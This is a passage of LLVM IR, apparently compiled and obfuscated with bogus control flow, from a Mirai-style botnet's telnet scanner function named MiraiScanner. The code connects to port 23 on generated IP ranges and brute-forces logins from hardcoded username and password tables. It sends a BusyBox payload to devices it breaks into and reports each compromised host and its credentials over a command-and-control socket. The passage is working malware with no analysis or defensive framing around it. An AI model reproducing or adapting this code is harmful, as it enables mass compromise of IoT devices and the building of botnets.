  %1391 = zext i8 %1390 to i64
  %1392 = icmp eq i64 %1391, 19
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %221
  %1393 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %1393, align 4
  %1394 = call zeroext i16 @htons(i16 zeroext 23) #10
  %1395 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %1394, i16* %1395, align 2
  %1396 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %1397 = getelementptr inbounds [8 x i8], [8 x i8]* %1396, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1397, i8 0, i64 8, i32 4, i1 false)
  %1398 = load i32, i32* %6, align 4
  %1399 = sext i32 %1398 to i64
  %1400 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1399
  %1401 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1400, i32 0, i32 1
  %1402 = load i32, i32* %1401, align 4
  %1403 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %1404 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1403, i32 0, i32 0
  store i32 %1402, i32* %1404, align 4
  %1405 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %1406 = load i32, i32* %6, align 4
  %1407 = sext i32 %1406 to i64
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1407
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1408, i32 0, i32 0
  store i32 %1405, i32* %1409, align 16
  %1410 = load i32, i32* %6, align 4
  %1411 = sext i32 %1410 to i64
  %1412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1411
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1412, i32 0, i32 0
  %1414 = load i32, i32* %1413, align 16
  %1415 = icmp eq i32 %1414, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %261
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %300
  %1416 = call i32* @__errno_location() #10
  %1417 = load i32, i32* %1416, align 4
  %1418 = icmp ne i32 %1417, 115
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %320
  %1419 = load i32, i32* %6, align 4
  %1420 = sext i32 %1419 to i64
  %1421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1420
  call void @reset_telstate(%struct.telstate_t* %1421)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %340
  %1422 = load i32, i32* %6, align 4
  %1423 = sext i32 %1422 to i64
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1423
  call void @advance_telstate(%struct.telstate_t* %1424, i32 1)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %371
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %479
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %496
  %1425 = load i32, i32* %6, align 4
  %1426 = sext i32 %1425 to i64
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1426
  %1428 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1427, i32 0, i32 0
  %1429 = load i32, i32* %1428, align 16
  %1430 = load i32, i32* %3, align 4
  %1431 = load i32, i32* %6, align 4
  %1432 = sext i32 %1431 to i64
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1433, i32 0, i32 9
  %1435 = load i8*, i8** %1434, align 8
  %1436 = call i32 @read_until_response(i32 %1429, i32 %1430, i8* %1435, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %1437 = icmp ne i32 %1436, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %559
  %1438 = load i32, i32* %6, align 4
  %1439 = sext i32 %1438 to i64
  %1440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1439
  call void @reset_telstate(%struct.telstate_t* %1440)
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %579
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %678
  %1441 = load i32, i32* %6, align 4
  %1442 = sext i32 %1441 to i64
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1442
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1443, i32 0, i32 7
  %1445 = load i32, i32* %1444, align 16
  %_ = sub i32 0, %1445
  %gen = add i32 %_, 7
  %_51 = shl i32 %1445, 7
  %_52 = sub i32 0, %1445
  %gen53 = add i32 %_52, 7
  %_54 = sub i32 %1445, 7
  %gen55 = mul i32 %_54, 7
  %_56 = sub i32 %1445, 7
  %gen57 = mul i32 %_56, 7
  %_58 = sub i32 0, %1445
  %gen59 = add i32 %_58, 7
  %1446 = add i32 %1445, 7
  %1447 = zext i32 %1446 to i64
  %1448 = call i64 @time(i64* null) #5
  %1449 = icmp slt i64 %1447, %1448
  br label %originalBB50

originalBB63alteredBB:                            ; preds = %originalBB63, %832
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %849
  %1450 = load i32, i32* %6, align 4
  %1451 = sext i32 %1450 to i64
  %1452 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1451
  call void @reset_telstate(%struct.telstate_t* %1452)
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %869
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %901
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %970
  %1453 = load i32, i32* %6, align 4
  %1454 = sext i32 %1453 to i64
  %1455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1454
  call void @reset_telstate(%struct.telstate_t* %1455)
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %990
  %1456 = load i32, i32* @mainCommSock, align 4
  %1457 = load i32, i32* %6, align 4
  %1458 = sext i32 %1457 to i64
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1458
  %1460 = call i8* @get_telstate_host(%struct.telstate_t* %1459)
  %1461 = load i32, i32* %6, align 4
  %1462 = sext i32 %1461 to i64
  %1463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1462
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1463, i32 0, i32 4
  %1465 = load i8, i8* %1464, align 2
  %1466 = zext i8 %1465 to i64
  %1467 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1466
  %1468 = load i8*, i8** %1467, align 8
  %1469 = load i32, i32* %6, align 4
  %1470 = sext i32 %1469 to i64
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1470
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1471, i32 0, i32 5
  %1473 = load i8, i8* %1472, align 1
  %1474 = zext i8 %1473 to i64
  %1475 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1474
  %1476 = load i8*, i8** %1475, align 8
  %1477 = call i32 (i32, i8*, ...) @sockprintf(i32 %1456, i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.492, i32 0, i32 0), i8* %1460, i8* %1468, i8* %1476)
  %1478 = load i32, i32* %6, align 4
  %1479 = sext i32 %1478 to i64
  %1480 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1479
  call void @advance_telstate(%struct.telstate_t* %1480, i32 8)
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %1032
  %1481 = call i64 @time(i64* null) #5
  %1482 = trunc i64 %1481 to i32
  %1483 = load i32, i32* %6, align 4
  %1484 = sext i32 %1483 to i64
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1484
  %1486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1485, i32 0, i32 7
  store i32 %1482, i32* %1486, align 16
  %1487 = load i32, i32* %6, align 4
  %1488 = sext i32 %1487 to i64
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1488
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1489, i32 0, i32 0
  %1491 = load i32, i32* %1490, align 16
  %1492 = call i64 @send(i32 %1491, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.493, i32 0, i32 0), i64 4, i32 16384)
  %1493 = icmp slt i64 %1492, 0
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %1071
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %1088
  %1494 = load i32, i32* %6, align 4
  %1495 = sext i32 %1494 to i64
  %1496 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1495
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1496, i32 0, i32 0
  %1498 = load i32, i32* %1497, align 16
  %1499 = load i8*, i8** @Busybox_Payload, align 8
  %1500 = load i8*, i8** @Busybox_Payload, align 8
  %1501 = call i64 @strlen(i8* %1500) #9
  %1502 = call i64 @send(i32 %1498, i8* %1499, i64 %1501, i32 16384)
  %1503 = icmp slt i64 %1502, 0
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %1155
  %1504 = load i32, i32* %6, align 4
  %1505 = sext i32 %1504 to i64
  %1506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1505
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1506, i32 0, i32 9
  %1508 = load i8*, i8** %1507, align 8
  %1509 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %1508, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.496, i32 0, i32 0))
  %1510 = icmp ne i32 %1509, 0
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %1218
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %1245
  %1511 = load i32, i32* %6, align 4
  %1512 = sext i32 %1511 to i64
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1512
  %1514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1513, i32 0, i32 3
  %1515 = load i8, i8* %1514, align 1
  %1516 = zext i8 %1515 to i32
  %1517 = icmp ne i32 %1516, 3
  br label %originalBB107

originalBB111alteredBB:                           ; preds = %originalBB111, %1269
  %1518 = load i32, i32* @mainCommSock, align 4
  %1519 = load i32, i32* %6, align 4
  %1520 = sext i32 %1519 to i64
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1520
  %1522 = call i8* @get_telstate_host(%struct.telstate_t* %1521)
  %1523 = load i32, i32* %6, align 4
  %1524 = sext i32 %1523 to i64
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1524
  %1526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1525, i32 0, i32 4
  %1527 = load i8, i8* %1526, align 2
  %1528 = zext i8 %1527 to i64
  %1529 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1528
  %1530 = load i8*, i8** %1529, align 8
  %1531 = load i32, i32* %6, align 4
  %1532 = sext i32 %1531 to i64
  %1533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %1532
  %1534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1533, i32 0, i32 5
  %1535 = load i8, i8* %1534, align 1
  %1536 = zext i8 %1535 to i64
  %1537 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1536
  %1538 = load i8*, i8** %1537, align 8
  %1539 = call i32 (i32, i8*, ...) @sockprintf(i32 %1518, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.498, i32 0, i32 0), i8* %1522, i8* %1530, i8* %1538)
  br label %originalBB111

originalBB115alteredBB:                           ; preds = %originalBB115, %1313
  br label %originalBB115

originalBB119alteredBB:                           ; preds = %originalBB119, %1330
  %1540 = load i32, i32* %6, align 4
  %1541 = add nsw i32 %1540, 1
  store i32 %1541, i32* %6, align 4
  br label %originalBB119

originalBB123alteredBB:                           ; preds = %originalBB123, %1349
  br label %originalBB123
}

; Function Attrs: nounwind
declare i32 @getdtablesize() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #5

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @MiraiScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %27, %28
  br i1 %29, label %30, label %32

; <label>:30:                                     ; preds = %2
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %5, align 4
  br label %32

; <label>:32:                                     ; preds = %30, %2
  %33 = load i32, i32* @x.73
  %34 = load i32, i32* @y.74
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %32
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %41, align 4
  %42 = call zeroext i16 @htons(i16 zeroext 23) #10
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %42, i16* %43, align 2
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %45 = getelementptr inbounds [8 x i8], [8 x i8]* %44, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 8, i32 4, i1 false)
  %46 = call noalias i8* @malloc(i64 1025) #5
  store i8* %46, i8** %17, align 8
  %47 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 1025, i32 1, i1 false)
  %48 = load i32, i32* %5, align 4
  %49 = zext i32 %48 to i64
  %50 = call i8* @llvm.stacksave()
  store i8* %50, i8** %19, align 8
  %51 = alloca %struct.telstate_t, i64 %49, align 16
  %52 = bitcast %struct.telstate_t* %51 to i8*
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = mul i64 %54, 5
  call void @llvm.memset.p0i8.i64(i8* %52, i8 0, i64 %55, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  %56 = load i32, i32* @x.73
  %57 = load i32, i32* @y.74
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %64

; <label>:64:                                     ; preds = %82, %originalBBpart2
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %5, align 4
  %67 = icmp slt i32 %65, %66
  br i1 %67, label %68, label %85

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* %6, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %70
  %72 = bitcast %struct.telstate_t* %71 to i8*
  call void @llvm.memset.p0i8.i64(i8* %72, i8 0, i64 32, i32 16, i1 false)
  %73 = load i32, i32* %6, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %74
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %75, i32 0, i32 3
  store i8 1, i8* %76, align 1
  %77 = load i8*, i8** %17, align 8
  %78 = load i32, i32* %6, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %79
  %81 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %80, i32 0, i32 9
  store i8* %77, i8** %81, align 8
  br label %82

; <label>:82:                                     ; preds = %68
  %83 = load i32, i32* %6, align 4
  %84 = add nsw i32 %83, 1
  store i32 %84, i32* %6, align 4
  br label %64

; <label>:85:                                     ; preds = %64
  %86 = load i32, i32* @x.73
  %87 = load i32, i32* @y.74
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %85
  %94 = load i32, i32* @x.73
  %95 = load i32, i32* @y.74
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %102

; <label>:102:                                    ; preds = %originalBBpart2150, %originalBBpart24
  br label %103

; <label>:103:                                    ; preds = %102
  %104 = load i32, i32* @x.73
  %105 = load i32, i32* @y.74
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %103
  store i32 0, i32* %6, align 4
  %112 = load i32, i32* @x.73
  %113 = load i32, i32* @y.74
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %120

; <label>:120:                                    ; preds = %originalBBpart2146, %originalBBpart28
  %121 = load i32, i32* @x.73
  %122 = load i32, i32* @y.74
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %120
  %129 = load i32, i32* %6, align 4
  %130 = load i32, i32* %5, align 4
  %131 = icmp slt i32 %129, %130
  %132 = load i32, i32* @x.73
  %133 = load i32, i32* @y.74
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %131, label %140, label %1391

; <label>:140:                                    ; preds = %originalBBpart212
  %141 = load i32, i32* %6, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 7
  %145 = load i32, i32* %144, align 16
  %146 = icmp eq i32 %145, 0
  br i1 %146, label %147, label %154

; <label>:147:                                    ; preds = %140
  %148 = call i64 @time(i64* null) #5
  %149 = trunc i64 %148 to i32
  %150 = load i32, i32* %6, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %151
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %152, i32 0, i32 7
  store i32 %149, i32* %153, align 16
  br label %154

; <label>:154:                                    ; preds = %147, %140
  %155 = load i32, i32* %6, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = zext i8 %159 to i32
  switch i32 %160, label %1355 [
    i32 0, label %161
    i32 1, label %377
    i32 2, label %530
    i32 3, label %662
    i32 4, label %707
    i32 5, label %791
    i32 6, label %868
    i32 7, label %1048
    i32 8, label %1146
  ]

; <label>:161:                                    ; preds = %154
  %162 = load i32, i32* %6, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 3
  %166 = load i8, i8* %165, align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 1
  br i1 %168, label %169, label %189

; <label>:169:                                    ; preds = %161
  %170 = load i32, i32* %6, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 9
  %174 = load i8*, i8** %173, align 8
  store i8* %174, i8** %20, align 8
  %175 = load i32, i32* %6, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %176
  %178 = bitcast %struct.telstate_t* %177 to i8*
  call void @llvm.memset.p0i8.i64(i8* %178, i8 0, i64 32, i32 16, i1 false)
  %179 = load i8*, i8** %20, align 8
  %180 = load i32, i32* %6, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 9
  store i8* %179, i8** %183, align 8
  %184 = call i32 @MiraiIPRanges()
  %185 = load i32, i32* %6, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 1
  store i32 %184, i32* %188, align 4
  br label %317

; <label>:189:                                    ; preds = %161
  %190 = load i32, i32* @x.73
  %191 = load i32, i32* @y.74
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %189
  %198 = load i32, i32* %6, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 3
  %202 = load i8, i8* %201, align 1
  %203 = zext i8 %202 to i32
  %204 = icmp eq i32 %203, 0
  %205 = load i32, i32* @x.73
  %206 = load i32, i32* @y.74
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %204, label %213, label %300

; <label>:213:                                    ; preds = %originalBBpart216
  %214 = load i32, i32* @x.73
  %215 = load i32, i32* @y.74
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %213
  %222 = load i32, i32* %6, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %223
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %224, i32 0, i32 4
  %226 = load i8, i8* %225, align 2
  %227 = add i8 %226, 1
  store i8 %227, i8* %225, align 2
  %228 = load i32, i32* %6, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %229
  %231 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %230, i32 0, i32 5
  %232 = load i8, i8* %231, align 1
  %233 = add i8 %232, 1
  store i8 %233, i8* %231, align 1
  %234 = load i32, i32* %6, align 4
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %235
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %236, i32 0, i32 5
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i64
  %240 = icmp eq i64 %239, 1
  %241 = load i32, i32* @x.73
  %242 = load i32, i32* @y.74
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart225, label %originalBB18alteredBB

originalBBpart225:                                ; preds = %originalBB18
  br i1 %240, label %249, label %254

; <label>:249:                                    ; preds = %originalBBpart225
  %250 = load i32, i32* %6, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %251
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %252, i32 0, i32 3
  store i8 1, i8* %253, align 1
  br label %254

; <label>:254:                                    ; preds = %249, %originalBBpart225
  %255 = load i32, i32* @x.73
  %256 = load i32, i32* @y.74
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %254
  %263 = load i32, i32* %6, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %264
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %265, i32 0, i32 4
  %267 = load i8, i8* %266, align 2
  %268 = zext i8 %267 to i64
  %269 = icmp eq i64 %268, 1
  %270 = load i32, i32* @x.73
  %271 = load i32, i32* @y.74
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br i1 %269, label %278, label %299

; <label>:278:                                    ; preds = %originalBBpart229
  %279 = load i32, i32* @x.73
  %280 = load i32, i32* @y.74
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %278
  %287 = load i32, i32* %6, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %51, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 3
  store i8 1, i8* %290, align 1
  %291 = load i32, i32* @x.73
  %292 = load i32, i32* @y.74
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %1372

; <label>:299:                                    ; preds = %originalBBpart229
  br label %300

; <label>:300:                                    ; preds = %299, %originalBBpart216
  %301 = load i32, i32* @x.73
  %302 = load i32, i32* @y.74
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB35, label %originalBB35alteredBB

